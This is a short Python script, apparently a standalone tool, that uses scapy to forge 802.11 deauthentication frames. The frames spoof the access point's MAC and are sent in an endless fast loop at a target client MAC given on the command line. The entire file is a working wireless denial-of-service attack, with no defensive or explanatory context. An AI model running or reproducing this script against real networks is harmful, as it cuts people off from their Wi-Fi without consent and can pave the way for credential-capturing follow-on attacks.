from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth


def disconnect(target_mac, gateway_mac):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=0.001, loop=1, iface="wlx00c140610e6c", verbose=1)


if __name__ == "__main__":
    target_mac = sys.argv[1:2].pop()
    gateway_mac = sys.argv[2:3].pop()
    disconnect(target_mac, gateway_mac)
